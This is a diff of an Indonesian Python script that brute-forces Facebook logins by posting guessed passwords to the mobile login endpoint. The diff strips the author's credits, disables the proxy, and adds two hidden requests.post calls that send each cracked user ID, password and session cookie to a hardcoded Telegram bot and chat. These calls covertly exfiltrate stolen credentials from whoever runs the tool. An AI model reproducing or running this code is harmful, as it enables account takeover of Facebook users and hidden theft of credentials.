@@ -1,18 +1,3 @@
-# Author by HikmatXD
-# Jangan Keras Merecode Script Kami!!! 
-# https://github.com/HIKMAT-xyz
-# Jangan lupa follow github saya:)
-     
-     # Corporation Arona Multi Brute Force
-     # Tricker Not Hacker
-     # Fb : Hikmat Ceremony Queenz Sr.
-     # Whastapp : 082115413282
-
-# Grup Whastapp Admin : https://chat.whatsapp.com/DvXb23TbzQ1CfDvXwr2ifj
-# Script Ini 100% Open Source Code:) 
-# Kalo Ada Yang Jual Script Gw Bilang Yak! 
-# Hai Perikod:) 
-
 import requests,bs4,rich,os,sys,random,re,datetime,time,json,stdiomask
 
 from concurrent.futures import ThreadPoolExecutor as tread
@@ -1235,21 +1220,23 @@ def mobile(uiz,pwr,link_okep):
 		try:
 			proxff= open('proxy_mat.txt','r').read().splitlines()
 			cuukk=random.choice(proxff)
-			proxs= {'http': 'socks5://'+cuukk}
+#			proxs= {'http': 'socks5://'+cuukk}
 			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D223505336087945%26redirect_uri%3Dhttps%253A%252F%252Ftinyurl.com%252Fapp%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D038c5740-c5f6-43ca-9d01-4e6b5afe3fdd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v3.3/dialog/oauth?client_id=223505336087945&redirect_uri=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2&ret=login&fbapp_pres=0&logger_id=038c5740-c5f6-43ca-9d01-4e6b5afe3fdd&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D223505336087945%26redirect_uri%3Dhttps%253A%252F%252Ftinyurl.com%252Fapp%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D038c5740-c5f6-43ca-9d01-4e6b5afe3fdd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftinyurl.com%2Fapp%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0dQEfkvlC5W7eDIjt51hFPDkXy9bGiikz834R4W2%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
 				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={uiz}\n{pw}")
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
+				requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={uiz}\n{pw}\n{kuki}")
 				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
 				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
